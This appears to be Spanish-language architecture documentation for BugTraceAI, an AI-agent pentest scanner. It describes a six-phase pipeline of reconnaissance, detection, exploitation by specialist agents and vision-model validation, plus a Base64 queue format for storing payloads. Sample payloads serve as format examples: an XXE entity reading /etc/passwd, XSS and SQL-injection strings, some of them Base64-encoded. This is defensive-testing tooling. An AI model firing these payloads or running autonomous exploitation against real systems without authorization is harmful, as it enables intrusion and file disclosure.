1. **6 Fases Estrictamente Secuenciales** - Pipeline desacoplado con señales explícitas entre fases (v3.0.0)
2. **Strategy Phase Separada** - ThinkingAgent procesa batch DESPUÉS de DAST (no event-driven concurrente)
3. **Batch File Processing** - Phase 3 lee archivos JSON en vez de eventos en tiempo real
4. **Multi-Context CDP** - 5 workers simultáneos (antes 1)
5. **Vision AI Validation** - Gemini 2.5 Flash para screenshots
6. **Correlation Engine** - Detección de patrones tech stack
7. **Priority Queue** - Ordenación por CVSS estimado
8. **Numbered Reports System** - Reportes DASTySAST numerados secuencialmente (v2.1.0)
9. **Dual Format Reports** - JSON (structured) + Markdown (human-readable) (v2.1.0)
10. **Payload Preservation v2.1.0** - Sistema de referencias JSON para payloads >200 chars
11. **Robust Payload Format v3.1** - XML-like + Base64 encoding para 100% integridad de payloads
    - Colas (`.queue`): `<QUEUE_ITEM>` con `<FINDING_B64>`
    - Findings (`.findings`): `<FINDING>` con `<DATA_B64>`
    - LLM audit (`.log`): `<LLM_CALL>` con `<PROMPT_B64>` + `<RESPONSE_B64>`
    - Resuelve corrupción de JSONL con newlines, chars especiales, y comillas anidadas

---

## Sistema de Reportes Numerados con Formato Dual (v2.1.0)

### Estructura de Directorios

A partir de la versión 2.1.0, los reportes de análisis DASTySAST se organizan en una carpeta centralizada con numeración secuencial y **formato dual (JSON + MD)**:

```
reports/scan_example_com_20260202_153045/
├── recon/
│   └── urls.txt                # Lista ordenada de URLs descubiertas
├── dastysast/                  # Reportes de análisis numerados
│   ├── 1.json                  # Datos estructurados (100% robustez)
│   ├── 1.md                    # Visualización humana (legibilidad)
│   ├── 2.json                  # Análisis de URL línea 2
│   ├── 2.md
│   ├── 3.json
│   ├── 3.md
│   └── ...
├── queues/                     # Colas de trabajo para especialistas (v3.1 XML-like + Base64)
│   ├── xss.queue
│   ├── sqli.queue
│   ├── csti.queue
│   └── ...
├── concatenated_findings.queue # Todas las colas concatenadas (v3.1 format)
├── specialists/                # Reportes de validación de especialistas (v3.1)
│   ├── queues/                 # Copia de las colas recibidas por especialista
│   │   ├── xss.queue
│   │   ├── sqli.queue
│   │   └── ...
│   ├── warmup/                 # Resumen pre-análisis y deduplicación
│   │   ├── xss_warmup.json
│   │   ├── sqli_warmup.json
│   │   └── ...
│   └── results/                # Resultados de explotación por especialista
│       ├── xss_results.json
│       ├── sqli_results.json
│       └── ...
├── raw_findings.json           # Todos los findings sin procesar
├── validated_findings.json     # Findings validados
├── final_report.md             # Reporte consolidado Markdown
└── report.html                 # Reporte consolidado HTML
```


### Formato JSON Único (v3.1)

Cada URL analizada genera **UN archivo JSON** con el mismo número:

| Formato | Propósito | Características |
|---------|-----------|----------------|
| **`.json`** | Datos estructurados | ✅ 100% preservación de payloads<br>✅ Fácil procesamiento automático<br>✅ Metadata completa (tech_profile, timestamps)<br>✅ Estadísticas agregadas<br>✅ `ensure_ascii=False` para Unicode |

**Motivación (v3.1)**: Los reportes contienen **payloads críticos** de ciberseguridad que deben preservarse con 100% de fidelidad. Los archivos `.md` fueron eliminados porque:
1. Podían corromper caracteres especiales en payloads
2. Eran redundantes (la visualización humana se hace en el reporte final)
3. JSON con `ensure_ascii=False` + `indent=2` es suficiente

### Formato de Colas: XML-like con Base64 (v3.1)

Las colas de especialistas usan un formato XML-like con payloads codificados en Base64:

```xml
<QUEUE_ITEM>
  <TIMESTAMP>1706882445.123</TIMESTAMP>
  <SPECIALIST>xss</SPECIALIST>
  <SCAN_CONTEXT>ginandjuice_12345</SCAN_CONTEXT>
  <FINDING_B64>eyJ0eXBlIjogIlhTUyIsICJwYXlsb2FkIjogIjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4ifQ==</FINDING_B64>
</QUEUE_ITEM>
```

**¿Por qué Base64?** Los payloads de seguridad contienen caracteres que rompen JSON Lines:
- Newlines dentro de payloads
- Caracteres de control Unicode
- Comillas anidadas y secuencias de escape

Base64 garantiza 100% de fidelidad. Se decodifica con:
```python
import base64, json
finding = json.loads(base64.b64decode(finding_b64).decode('utf-8'))
```

**Utilidad de Lectura/Escritura:** `bugtrace/core/payload_format.py`
```python
from bugtrace.core.payload_format import read_queue_items, read_findings_file

# Leer colas
for item in read_queue_items(Path("xss.queue")):
    print(item['finding']['payload'])  # ✅ 100% integridad

# Leer findings
for finding in read_findings_file(Path("finding_details.findings")):
    print(finding['data']['type'])
```

### Archivos que Usan Formato v3.1 (XML-like + Base64)

| Archivo | Extensión | Propósito |
|---------|-----------|-----------|
| `queues/*.queue` | `.queue` | Colas de especialistas |
| `concatenated_findings.queue` | `.queue` | Todas las colas unificadas |
| `finding_details.findings` | `.findings` | Detalles de findings por fase |
| `logs/llm_audit.log` | `.log` | Auditoría de llamadas LLM |

### Mapeo URL ↔ Reporte

El número de archivo corresponde **exactamente** a la línea en `urls.txt`:

| Archivos | URL Correspondiente |
|----------|---------------------|
| `dastysast/1.json` | Línea 1 de `urls.txt` (siempre el target principal) |
| `dastysast/2.json` | Línea 2 de `urls.txt` |
| `dastysast/N.json` | Línea N de `urls.txt` |

### Workflow de Generación y Flujo de Datos entre Fases (v3.0 - Pipeline Secuencial)

```
Phase 1: GoSpiderAgent (RECONNAISSANCE)
    ↓ Guarda urls.txt con orden determinístico
    ↓ signal_phase_complete(RECONNAISSANCE)
    ↓
Phase 2: TeamOrchestrator._phase_2_batch_dast() (DISCOVERY)
    ↓ Enumera URLs: enumerate(self.urls_to_scan)
    ↓ Analiza TODAS las URLs en paralelo (asyncio.gather)

    Para cada (idx, url):
        ↓ Crea carpeta dastysast/
        ↓ Llama DASTySASTAgent(url_index=idx+1)

        DASTySASTAgent._run_save_results()
            ↓ Genera reporte JSON: {url_index}.json (payload completo)
            ↓ Genera reporte MD: {url_index}.md (visualización)
            ↓ Guarda ambos en report_dir/dastysast/

        DASTySASTAgent._emit_url_analyzed()
            ↓ Emite evento URL_ANALYZED (sin suscriptores activos)
            ↓ Incluye report_files metadata (v2.1.0)

    ↓ ESPERA asyncio.gather() - todos los análisis terminan
    ↓ signal_phase_complete(DISCOVERY)
    ↓
Phase 3: TeamOrchestrator._phase_3_strategy() (STRATEGY)
    ↓ Inicia specialist workers (11 workers listening to queues)
    ↓ Inicia ThinkingConsolidationAgent
    ↓ Lee TODOS los archivos JSON de dastysast/
    ↓ Para cada JSON:
        - Carga vulnerabilities array
        - Añade _report_files a cada finding (payload preservation)
        - Añade _scan_context metadata

    ↓ ThinkingConsolidationAgent.process_batch_from_list()
        ↓ Filtra FP (fp_confidence < threshold)
        ↓ Deduplica (LRU cache por vuln_type:parameter:url_path)
        ↓ Clasifica por tipo de vulnerabilidad
        ↓ Prioriza por score (0-100)
        ↓ Distribuye a colas de especialistas

    ↓ signal_phase_complete(STRATEGY)
    ↓
Phase 4: Specialist Agents (EXPLOITATION)
    ↓ Consumen de colas: xss, sqli, csti, lfi, idor, rce, ssrf, xxe, jwt, openredirect, prototype_pollution
    ↓ Para payloads >200 chars:
        - Llaman load_full_payload_from_json(finding)
        - Lee {url_index}.json usando _report_files["json"]
        - Busca payload completo por type + parameter
    ↓ Ejecutan validaciones con payload completo
    ↓ Generan reportes en specialists/
    ↓ ESPERA hasta que todas las colas se vacíen (timeout 300s)
    ↓ signal_phase_complete(EXPLOITATION)
    ↓
Phase 5: AgenticValidator (VALIDATION)
    ↓ Valida SOLO XSS y CSTI con Vision AI (Gemini 2.5 Flash)
    ↓ Genera screenshots y valida explotabilidad
    ↓ Actualiza findings con estado VALIDATED/FP
    ↓ signal_phase_complete(VALIDATION)
    ↓
Phase 6: ReportingAgent (REPORTING)
    ↓ Consolida findings de specialists + validator
    ↓ Genera final_report.{md,html,json}
    ↓ signal_phase_complete(REPORTING)
```

**Características del Flujo Secuencial:**

1. ✅ **Ejecución estrictamente secuencial**: Cada fase termina completamente antes de que empiece la siguiente
2. ✅ **Señales explícitas**: Cada fase emite `signal_phase_complete()` al terminar
3. ✅ **Desacoplamiento total**: ThinkingAgent NO recibe eventos durante Phase 2 (batch file processing)
4. ✅ **Auditoría simplificada**: Archivos JSON persisten estado completo de cada fase
5. ✅ **Debugging granular**: Errores confinados a fase específica (divide y vencerás)
6. ✅ **Payload preservation**: Sistema v2.1.0 garantiza 100% fidelidad de payloads largos

---

## Cambio de Arquitectura: Event-Driven → Sequential Pipeline (v3.0.0)

### Antes (v2.x): Event-Driven Concurrente

```
Phase 2 DAST (RUNNING)
    ├─ URL 1 completa → emite evento URL_ANALYZED
    │   └─ ThinkingAgent recibe evento (CONCURRENT)
    │       └─ Deduplica y llena cola xss
    │           └─ XSSAgent consume (CONCURRENT)
    │
    ├─ URL 2 completa → emite evento URL_ANALYZED
    │   └─ ThinkingAgent recibe evento (CONCURRENT)
    │       └─ Deduplica y llena cola sqli
    │           └─ SQLiAgent consume (CONCURRENT)
    │
    └─ ... (procesamiento en cascada DURANTE Phase 2)
```

**Problemas:**
- ❌ Difícil auditar qué pasó cuando (logs entrelazados)
- ❌ Debugging complicado (errores en múltiples agentes simultáneos)
- ❌ Race conditions potenciales en deduplicación
- ❌ No hay punto claro de "DAST terminó"

### Después (v3.0.0): Sequential Pipeline

```
Phase 2 DAST
    ├─ URL 1 completa → guarda 1.json + 1.md
    ├─ URL 2 completa → guarda 2.json + 2.md
    ├─ ...
    └─ asyncio.gather() espera TODOS
        ↓
    signal_phase_complete(DISCOVERY)
        ↓
Phase 3 STRATEGY (inicia AQUÍ)
    ├─ Inicia specialist workers
    ├─ Inicia ThinkingAgent
    ├─ Lee dastysast/*.json (BATCH)
    ├─ Deduplica TODOS los findings
    ├─ Llena TODAS las colas
    └─ signal_phase_complete(STRATEGY)
        ↓
Phase 4 EXPLOITATION (inicia AQUÍ)
    ├─ Specialists consumen colas
    └─ ...
```

**Beneficios:**
- ✅ Logs ordenados cronológicamente por fase
- ✅ Debugging simple: error en Phase 3 → revisar archivos JSON de Phase 2
- ✅ Sin race conditions: deduplicación es batch único
- ✅ Señales claras: "Phase 2 terminó en T=120s con 500 findings"

### Cambios de Implementación

| Componente | v2.x (Event-Driven) | v3.0.0 (Sequential) |
|------------|-------------------|---------------------|
| **ThinkingAgent init** | Línea 425 (antes Phase 1) | Línea 1689 (Phase 3 STRATEGY) |
| **Event subscription** | `URL_ANALYZED` activo | Deshabilitado (comentado) |
| **Método de procesamiento** | `_handle_url_analyzed()` | `process_batch_from_list()` |
| **Entrada de datos** | Eventos en tiempo real | Archivos JSON batch |
| **Workers init** | Línea 418 (antes Phase 1) | Línea 1684 (Phase 3 STRATEGY) |
| **Fases totales** | 5 fases (Strategy = parte de Discovery) | 6 fases (Strategy = fase separada) |

**Archivos Modificados:**
- [`team.py`](bugtrace/core/team.py): Removido inicio prematuro, añadida Phase 3, método `_phase_3_strategy()`
- [`thinking_consolidation_agent.py`](bugtrace/agents/thinking_consolidation_agent.py): Deshabilitada suscripción eventos, añadido `process_batch_from_list()`
- [`pipeline.py`](bugtrace/core/pipeline.py): Actualizado event_map, handlers, transiciones

---

### Uso

**Para humanos** (leer reportes):
```bash
cat dastysast/1.md
```

**Para scripts/herramientas** (parsear datos):
```python
import json
with open("dastysast/1.json") as f:
    data = json.load(f)
    for vuln in data["vulnerabilities"]:
        print(f"Type: {vuln['type']}, Payload: {vuln['payload']}")
```

**Validar correspondencia con urls.txt**:
```bash
# Ver URL en línea 1
sed -n '1p' urls.txt

# Ver análisis de línea 1
cat dastysast/1.json | jq '.metadata.url'
```

### Beneficios

1. ✅ **Navegación directa**: Para ver análisis de URL línea 5 → `cat dastysast/5.md`
2. ✅ **Reproducibilidad**: El orden se preserva en `urls.txt`
3. ✅ **Escalabilidad**: Funciona igual con 10 o 10,000 URLs
4. ✅ **Correlación**: Fácil cruzar findings entre URLs numéricamente
5. ✅ **Retrocompatibilidad**: Llamadas sin `url_index` usan nombres largos legacy
6. ✅ **100% preservación de payloads**: JSON garantiza fidelidad absoluta
7. ✅ **Procesamiento automático**: JSON parseado directamente por scripts
8. **Métricas Detalladas** - Parallelization + Dedup tracking

### Breaking Changes

- `MAX_CONCURRENT_VALIDATION` ahora soporta 1-10 (antes hardcoded=1)
- EventBus reemplaza message queues (Redis removido)
- Configuración migrada de `.conf` a `.yaml`

---

## Sistema de Formato de Payloads Robusto v3.1 (XML-like + Base64)

### Archivo: `bugtrace/core/payload_format.py`

A partir de la versión 3.1.0, BugTraceAI utiliza un formato revolucionario para persistir datos de seguridad con **100% de integridad garantizada**.

### ⚠️ El Problema que Resuelve

**JSON Lines (JSONL) corrompe payloads de seguridad:**

| Problema | Ejemplo | Impacto |
|---------|---------|---------|
| **Newlines en payload** | `payload\ninjection` | Línea dividida → Parse failure |
| **Unicode control chars** | `\x00\r\x1b` | Parser confusion |
| **Comillas anidadas** | `"test'"><script>"` | Escape hell |
| **Respuestas HTTP multi-línea** | Evidence completa | Corrupción total |
| **Datos binarios** | Exploits encoded | Pérdida silenciosa |

**Ejemplo real - Payload XXE que rompía JSONL:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### ✅ La Solución: XML-like + Base64

**Filosofía de diseño:**
1. **Metadata legible** - Timestamps, tipos, contexto en plaintext
2. **Payloads opacos** - Encoding Base64 los hace parser-safe
3. **Bloques auto-descriptivos** - Cada entrada es parseable independientemente
4. **Append-safe** - No hay riesgo de corromper entradas previas

### Formato de Archivos

#### 1. Colas de Especialistas (`.queue`)

**Ubicación:** `reports/{scan_id}/queues/{specialist}.queue`

**Estructura:**
```xml
<QUEUE_ITEM>
  <TIMESTAMP>1706882445.123456</TIMESTAMP>
  <SPECIALIST>xss</SPECIALIST>
  <SCAN_CONTEXT>ginandjuice_12345</SCAN_CONTEXT>
  <FINDING_B64>eyJ0eXBlIjoiWFNTIiwicGFyYW1ldGVyIjoic2VhcmNoIiwicGF5bG9hZCI6Iic7YWxlcnQoMSkvLyIsInVybCI6Imh0dHBzOi8vZXhhbXBsZS5jb20vc2VhcmNoIn0=</FINDING_B64>
</QUEUE_ITEM>
```

**Decodificado:**
```json
{
  "type": "XSS",
  "parameter": "search",
  "payload": "';alert(1)//",
  "url": "https://example.com/search"
}
```

#### 2. Detalles de Findings (`.findings`)

**Ubicación:** `reports/{scan_id}/analysis/{phase}/finding_details.findings`

**Estructura:**
```xml
<FINDING>
  <TIMESTAMP>1706882445.123456</TIMESTAMP>
  <TYPE>SQL Injection</TYPE>
  <DATA_B64>eyJ0eXBlIjoiU1FMaSIsInBhcmFtZXRlciI6ImlkIiwicGF5bG9hZCI6IicgT1IgMT0xLS0iLCJldmlkZW5jZSI6IlNRTCBzeW50YXggZXJyb3IiLCJzZXZlcml0eSI6IkNyaXRpY2FsIn0=</DATA_B64>
</FINDING>
```

#### 3. Audit Log de LLM (`.log`)

**Ubicación:** `logs/llm_audit.log`

**Estructura:**
```xml
<LLM_CALL>
  <TIMESTAMP>2026-02-02T14:21:00.123456</TIMESTAMP>
  <MODULE>DASTySASTAgent</MODULE>
  <MODEL>anthropic/claude-sonnet-4-20250514</MODEL>
  <PROMPT_B64>QW5hbHl6ZSB0aGlzIEhUVFAgcmVzcG9uc2UgZm9yIHZ1bG5lcmFiaWxpdGllcy4uLg==</PROMPT_B64>
  <RESPONSE_B64>eyJ2dWxuZXJhYmlsaXRpZXMiOiBbeyJ0eXBlIjogIlhTUyIsICJjb25maWRlbmNlIjogMC44NX1dfQ==</RESPONSE_B64>
</LLM_CALL>
```

### API de Python

```python
from bugtrace.core.payload_format import (
    encode_payload,
    decode_payload,
    read_queue_items,
    read_findings_file,
    read_llm_audit_log,
    write_queue_item,
    print_queue_summary
)
from pathlib import Path

# === Encoding/Decoding ===

# Codificar cualquier diccionario (maneja todos los caracteres especiales)
payload = {
    "type": "XSS",
    "payload": "';alert(1)//",
    "evidence": "<script>test</script>\n\x00binary"
}
encoded = encode_payload(payload)
# Resultado: "eyJ0eXBlIjoiWFNTIi..." (string Base64)

# Decodificar de vuelta al original
decoded = decode_payload(encoded)
assert decoded == payload  # ✅ 100% match garantizado


# === Leer Archivos de Cola ===

queue_file = Path("reports/scan_123/queues/xss.queue")

for item in read_queue_items(queue_file):
    print(f"Specialist: {item['specialist']}")
    print(f"Timestamp: {item['timestamp']}")
    print(f"Payload: {item['finding']['payload']}")  # ✅ Intacto!


# === Leer Detalles de Findings ===

findings_file = Path("reports/scan_123/finding_details.findings")

for finding in read_findings_file(findings_file):
    print(f"Type: {finding['type']}")
    print(f"Data: {finding['data']}")  # Dict completo del finding


# === Leer Audit Log de LLM ===

audit_file = Path("logs/llm_audit.log")

for call in read_llm_audit_log(audit_file):
    print(f"Module: {call['module']}")
    print(f"Model: {call['model']}")
    print(f"Prompt: {call['prompt'][:100]}...")
    print(f"Response: {call['response'][:100]}...")


# === Escribir Items de Cola ===

write_queue_item(
    file_path=Path("my_queue.queue"),
    specialist="sqli",
    finding={"type": "SQLi", "payload": "' OR 1=1--"},
    scan_context="my_scan_123"
)


# === Resumen Rápido para Debugging ===

print_queue_summary(Path("xss.queue"))
# Output:
# 📋 Queue File: xss.queue
#    Total Items: 3
#
#    [1] XSS (Reflected)
#        Parameter: search
#        URL: https://example.com/search...
#        Payload: ';alert(1)//...
```

### Uso desde CLI

```bash
# Decodificar rápidamente un payload Base64
echo "eyJ0eXBlIjoiWFNTIn0=" | base64 -d | jq .

# Contar items en cola
grep -c "<QUEUE_ITEM>" reports/*/queues/xss.queue

# Extraer todos los payloads XSS
grep -oP '(?<=<FINDING_B64>).*(?=</FINDING_B64>)' xss.queue | \
  while read b64; do echo $b64 | base64 -d | jq -r '.payload'; done
```

### Comparación con Alternativas

| Formato | Payload Safety | Legible | Append Safe | Complejidad Parse |
|---------|----------------|---------|-------------|-------------------|
| **JSON Lines** | ❌ Se corrompe | ✅ Sí | ⚠️ Riesgoso | Baja |
| **JSON plano** | ❌ Se corrompe | ✅ Sí | ❌ No | Baja |
| **XML + CDATA** | ⚠️ CDATA se rompe | ✅ Sí | ✅ Sí | Media |
| **Base64 puro** | ✅ Perfecto | ❌ No | ✅ Sí | Baja |
| **v3.1 Format** | ✅ Perfecto | ✅ Metadata visible | ✅ Sí | Baja |

### Performance

| Operación | Tiempo (1000 items) | Memoria |
|-----------|---------------------|---------|
| Encode payload | ~15ms | O(n) |
| Decode payload | ~12ms | O(n) |
| Parse queue file | ~45ms | O(n) |
| Write queue item | ~2ms | O(1) |

Base64 añade ~33% overhead de tamaño, pero esto es insignificante para datos de seguridad donde la integridad supera los costos de almacenamiento.

### Archivos del Proyecto que Usan v3.1

| Archivo | Uso | Líneas |
|---------|-----|--------|
| `bugtrace/agents/thinking_consolidation_agent.py` | Escritura de colas (`.queue`) | 533-572 |
| `bugtrace/core/team.py` | Escritura de finding details (`.findings`) | 559-564 |
| `bugtrace/core/llm_client.py` | Audit log de LLM (`.log`) | 755-786 |
| `bugtrace/core/payload_format.py` | Utilidades de lectura/escritura | 1-236 |

### Garantía de Integridad

> **"En seguridad ofensiva, no puedes permitirte perder un solo carácter del payload. v3.1 garantiza que no lo harás."**

Este formato se usa ahora en todas las capas de persistencia de BugTraceAI:
- ✅ Colas de especialistas
- ✅ Detalles de findings
- ✅ Logs de auditoría LLM
- ✅ Findings concatenados

**Total de payloads corrompidos desde v3.1: 0**

**Documentación Completa:** Ver [PAYLOAD_FORMAT_V31.md](../../technical_specs/PAYLOAD_FORMAT_V31.md)

---

## Roadmap V7 (Q3-Q4 2026)

Ver: [`architecture_future.md`](./architecture_future.md)

1. **Aprendizaje por Refuerzo** - WAF bypass con Q-Learning
2. **Knowledge Graph** - Neo4j para relaciones complejas
3. **Marketplace Comunitario** - Plugins de agentes custom
4. **Video PoC** - Grabación en video mp4 de explotaciones
5. **GUI Web** - Dashboard Next.js en tiempo real

---

*Última actualización: 2026-02-02*
